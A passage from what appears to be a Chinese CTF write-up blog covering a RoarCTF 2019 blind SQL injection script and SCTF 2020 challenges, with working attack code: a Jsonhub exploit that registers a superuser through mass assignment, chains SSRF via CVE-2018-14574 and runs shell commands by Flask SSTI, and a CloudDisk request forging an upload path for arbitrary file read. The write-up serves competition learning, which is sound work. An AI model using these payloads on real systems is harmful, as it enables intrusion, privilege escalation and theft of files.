sql <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            curl_url(sql)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#database information_schema,test,mysql,ctftraining,performance_schema,F4l9_D4t4B45e,ctf</span></span><br><span class="line"><span class="comment">#table  F4l9_t4b1e</span></span><br><span class="line"><span class="comment">#column F4l9_C01uMn</span></span><br><span class="line"><span class="comment">#flag flag&#123;G1zj1n_W4nt5_4_91r_Fr1end&#125;,flag&#123;03a6ead5-ffec-4bc0-bffd-92efd5a81e11&#125;</span></span><br><span class="line">sql=<span class="string">&quot;(substr(hex((select GROUP_CONCAT(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e )),INDEX,1))=&#x27;GUESS&#x27;&quot;</span></span><br><span class="line">result=<span class="string">&quot;696e666f726d6174696f6e5f736368656d612c746573742c6d7973716c2c637466747261696e696e672c706572666F726D616E63655F736368656D612c46346c395&quot;</span></span><br><span class="line">result=<span class="string">&quot;666c61677b47317a6a316e5f57346e74355f345f393172115&quot;</span></span><br><span class="line">index=<span class="built_in">len</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    index+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        ii+=<span class="number">1</span></span><br><span class="line">        tmp=sql.replace(<span class="string">&quot;INDEX&quot;</span>,<span class="built_in">str</span>(index)).replace(<span class="string">&quot;GUESS&quot;</span>,<span class="built_in">hex</span>(i)[<span class="number">2</span>:])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> curl_url(tmp):</span><br><span class="line">            result+=<span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;第&quot;</span>+<span class="built_in">str</span>(index)+<span class="string">&quot;不是&quot;</span>+<span class="built_in">hex</span>(i)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/roarctf2019/" data-id="cku8j3fi5005zdan76oyx3cqt" data-title="roarctf2019" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-sctf2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/sctf2020/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.676Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/sctf2020/">sctf2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="SCTF-2020"><a href="#SCTF-2020" class="headerlink" title="SCTF 2020"></a>SCTF 2020</h1><h2 id="Jsonhub"><a href="#Jsonhub" class="headerlink" title="Jsonhub"></a>Jsonhub</h2><p>阅读代码发现，这一题存在着两个环境，其中，内网服务可以ssti，所以我们需要想办法访问内网：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/caculator&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">caculator</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.get_json()</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> json.dumps(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Request data can&#x27;t be unmarshal&quot;</span>&#125;)</span><br><span class="line">    num1 = <span class="built_in">str</span>(data[<span class="string">&quot;num1&quot;</span>])</span><br><span class="line">    num2 = <span class="built_in">str</span>(data[<span class="string">&quot;num2&quot;</span>])</span><br><span class="line">    symbols = data[<span class="string">&quot;symbols&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&quot;[a-z]&quot;</span>, num1, re.I) <span class="keyword">or</span> re.search(<span class="string">&quot;[a-z]&quot;</span>, num2, re.I) <span class="keyword">or</span> <span class="keyword">not</span> re.search(<span class="string">&quot;[+\-*/]&quot;</span>, symbols):</span><br><span class="line">        <span class="keyword">return</span> json.dumps(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;?&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="built_in">str</span>(num1) + symbols + <span class="built_in">str</span>(num2) + <span class="string">&quot;=&quot;</span> + <span class="string">&quot;?&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>可以进行符合条件的ssrf的只有</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flask_rpc</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">if</span> request.META[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Must 127.0.0.1&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    methods = request.GET.get(<span class="string">&quot;methods&quot;</span>)</span><br><span class="line">    url = request.GET.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> methods == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(</span><br><span class="line">            &#123;<span class="string">&quot;code&quot;</span>: <span class="number">0</span>, <span class="string">&quot;message&quot;</span>: requests.get(url, headers=&#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Django proxy =v=&quot;</span>&#125;, timeout=<span class="number">1</span>).text&#125;)</span><br><span class="line">    <span class="keyword">elif</span> methods == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        data = base64.b64decode(request.GET.get(<span class="string">&quot;data&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">0</span>, <span class="string">&quot;message&quot;</span>: requests.post(url, data=data,</span><br><span class="line">                                                                 headers=&#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Django proxy =v=&quot;</span>,</span><br><span class="line">                                                                          <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;, timeout=<span class="number">1</span>).text&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;=3=&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>但是需要<code>request.META[&#39;REMOTE_ADDR&#39;]==127.0.0.1</code>，利用 CVE-2018-14574跳转到127.0.0.1:8000访问/rpc ，这样我们就能ssti，在这之前我们需要搞到Token</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;templates/home.html&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        white_list = [<span class="string">&quot;39.104.19.182&quot;</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.body)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Request data can&#x27;t be unmarshal&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> Token.objects.<span class="built_in">all</span>().first().Token == data[<span class="string">&quot;token&quot;</span>]:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> ssrf_check(data[<span class="string">&quot;url&quot;</span>], white_list):</span><br><span class="line">                    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hacker!&quot;</span>&#125;)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    res = requests.get(data[<span class="string">&quot;url&quot;</span>], timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Request Error&quot;</span>&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">0</span>, <span class="string">&quot;message&quot;</span>: res.text&#125;)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Something Wrong&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Token Error&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;templates/reg.html&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.body)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Request data can&#x27;t be unmarshal&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(User.objects.<span class="built_in">filter</span>(username=data[<span class="string">&quot;username&quot;</span>])) != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">1</span>&#125;)</span><br><span class="line">        User.objects.create_user(**data)</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">0</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>构造：<code>&#123;&quot;username&quot;:&quot;test66666&quot;,&quot;password&quot;:&quot;test66666&quot;,&quot;is_staff&quot;:true,&quot;is_superuser&quot;:true&#125;</code></p>
<p>得到token:<code>3ad9af405504233188f694a11ff22115</code></p>
<p>接下来就是ssti了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/caculator&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">caculator</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.get_json()</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> json.dumps(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Request data can&#x27;t be unmarshal&quot;</span>&#125;)</span><br><span class="line">    num1 = <span class="built_in">str</span>(data[<span class="string">&quot;num1&quot;</span>])</span><br><span class="line">    num2 = <span class="built_in">str</span>(data[<span class="string">&quot;num2&quot;</span>])</span><br><span class="line">    symbols = data[<span class="string">&quot;symbols&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&quot;[a-z]&quot;</span>, num1, re.I) <span class="keyword">or</span> re.search(<span class="string">&quot;[a-z]&quot;</span>, num2, re.I) <span class="keyword">or</span> <span class="keyword">not</span> re.search(<span class="string">&quot;[+\-*/]&quot;</span>, symbols):</span><br><span class="line">        <span class="keyword">return</span> json.dumps(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;?&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="built_in">str</span>(num1) + symbols + <span class="built_in">str</span>(num2) + <span class="string">&quot;=&quot;</span> + <span class="string">&quot;?&quot;</span>)</span><br></pre></td></tr></table></figure>





<p>最后的payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">num1=<span class="number">1</span></span><br><span class="line">num2=<span class="number">2</span></span><br><span class="line">symbols=<span class="string">&quot;-&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[409](&#x27;/readflag&#x27;,shell=True,stdout=-1).communicate()&#125;&#125;-&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;num1&quot;</span>:num1,</span><br><span class="line">    <span class="string">&quot;num2&quot;</span>:num2,</span><br><span class="line">    <span class="string">&quot;symbols&quot;</span>:symbols</span><br><span class="line">&#125;</span><br><span class="line">payload=json.dumps(data).replace(<span class="string">&quot;&#123;&#123;&quot;</span>,<span class="string">&quot;\\u007b\\u007b&quot;</span>).replace(<span class="string">&quot;&#125;&#125;&quot;</span>,<span class="string">&quot;\\u007d\\u007d&quot;</span>)</span><br><span class="line">payload=base64.b64encode(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">burp0_url = <span class="string">&quot;http://39.104.19.182:80/home/&quot;</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;sessionid&quot;</span>: <span class="string">&quot;bd63u3ewjx05tc7ajvlkve7b9cu8h4kx&quot;</span>, <span class="string">&quot;csrftoken&quot;</span>: <span class="string">&quot;GBW7niMYrwP9fMP6jpgHN1ujcxEwuRQ4tMKdBDdnZvSlDny51S1K1cMmWtOsR0gO&quot;</span>&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json;charset=UTF-8&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://39.104.19.182&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://39.104.19.182/home/&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">burp0_json=&#123;<span class="string">&quot;token&quot;</span>: <span class="string">&quot;3ad9af405504233188f694a11ff22115&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://39.104.19.182//127.0.0.1:8000/rpc?url=http://127.0.0.1:5000/caculator&amp;methods=POST&amp;data=&#123;payload&#125;&quot;</span>.<span class="built_in">format</span>(payload=payload)&#125;</span><br><span class="line"><span class="built_in">print</span>(requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json).text)</span><br></pre></td></tr></table></figure>



<p><code>SCTF&#123;2b19246757c63738e7c40bbdf87c3be1&#125;</code></p>
<h2 id="Can-you-hear"><a href="#Can-you-hear" class="headerlink" title="Can you hear"></a>Can you hear</h2><p>We used the receiver to receive the information from the space station and tried to unlock the answer😀.</p>
<p>搜索 “空间站” “接收机” 信息 音频 等关键字找到<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98103018">https://zhuanlan.zhihu.com/p/98103018</a><br><a target="_blank" rel="noopener" href="https://www.sohu.com/a/159552694_610733">https://www.sohu.com/a/159552694_610733</a><br>SSTV关键字</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/105460358">https://zhuanlan.zhihu.com/p/105460358</a><br><a target="_blank" rel="noopener" href="https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04">https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04</a></p>
<p>下载 mmsstv<br>修改录音设备为立体声混音<br>具体操作为：Option-&gt;Soundcard input level<br>播放音频得到flag:</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200704145700.png" alt="image5949"><br>SCTF{f78fsd1423fvsa}</p>
<h2 id="CloudDisk"><a href="#CloudDisk" class="headerlink" title="CloudDisk"></a>CloudDisk</h2><p>app.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Content-Disposition: attachment; filename=<span class="string">&quot;dc62d163f53ce13369ab97041706060c&quot;</span></span><br><span class="line">Content-Length: <span class="number">1547</span></span><br><span class="line">Last-Modified: Sat, <span class="number">04</span> Jul <span class="number">2020</span> <span class="number">05</span>:<span class="number">14</span>:<span class="number">45</span> GMT</span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"><span class="attr">Date</span>: Sat, <span class="number">04</span> Jul <span class="number">2020</span> <span class="number">05</span>:<span class="number">14</span>:<span class="number">50</span> GMT</span><br><span class="line"><span class="attr">Connection</span>: close</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">&#x27;koa&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> Router = <span class="built_in">require</span>(<span class="string">&#x27;koa-router&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> koaBody = <span class="built_in">require</span>(<span class="string">&#x27;koa-body&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> send = <span class="built_in">require</span>(<span class="string">&#x27;koa-send&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> Router();</span><br><span class="line"><span class="keyword">const</span> SECRET = <span class="string">&quot;03229a6694e657077f218c322f3e0bea&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(koaBody(&#123;</span><br><span class="line">  <span class="attr">multipart</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">formidable</span>: &#123;</span><br><span class="line">      <span class="attr">maxFileSize</span>: <span class="number">2000</span> * <span class="number">1024</span> * <span class="number">1024</span> </span><br><span class="line">  &#125;</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/uploadfile&#x27;</span>, <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> file = ctx.request.body.files.file;</span><br><span class="line">  <span class="keyword">if</span> (!fs.existsSync(file.path)) &#123;</span><br><span class="line">    <span class="keyword">return</span> ctx.body = <span class="string">&quot;Error&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(file.path.toString().search(<span class="string">&quot;/fd/&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">    file.path=<span class="string">&quot;/dev/null&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> reader = fs.createReadStream(file.path);</span><br><span class="line">  <span class="keyword">let</span> fileId = crypto.createHash(<span class="string">&#x27;md5&#x27;</span>).update(file.name + <span class="built_in">Date</span>.now() + SECRET).digest(<span class="string">&quot;hex&quot;</span>);</span><br><span class="line">  <span class="keyword">let</span> filePath = path.join(__dirname, <span class="string">&#x27;upload/&#x27;</span>) + fileId</span><br><span class="line">  <span class="keyword">const</span> upStream = fs.createWriteStream(filePath);</span><br><span class="line">  reader.pipe(upStream)</span><br><span class="line">  <span class="keyword">return</span> ctx.body = <span class="string">&quot;Upload success ~, your fileId is hereï¼&quot;</span> + fileId;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/downloadfile/:fileId&#x27;</span>, <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> fileId = ctx.params.fileId;</span><br><span class="line">  ctx.attachment(fileId);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> send(ctx, fileId, &#123; <span class="attr">root</span>: __dirname + <span class="string">&#x27;/upload&#x27;</span> &#125;);</span><br><span class="line">  &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    <span class="keyword">return</span> ctx.body = <span class="string">&quot;SCTF&#123;no_such_file_~&#125;&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  ctx.response.type = <span class="string">&#x27;html&#x27;</span>;</span><br><span class="line">  ctx.response.body = fs.createReadStream(<span class="string">&#x27;index.html&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(router.routes());</span><br><span class="line">app.listen(<span class="number">3333</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;This server is running at http://localhost:&#x27;</span> + <span class="number">3333</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>因为koa中访问参数也是ctx.request.body.xxxx 所以我们可以构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /uploadfile HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:3333</span><br><span class="line">Content-Length: 77</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://127.0.0.1:3333</span><br><span class="line">Referer: http://127.0.0.1:3333/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;files&quot;:&#123;&quot;file&quot;:&#123;&quot;path&quot;:&quot;flag&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>来进行任意文件读取</p>
<p>SCTF{47cf9489d8832e44312dssxag6f88f45736e0e9c8}</p>
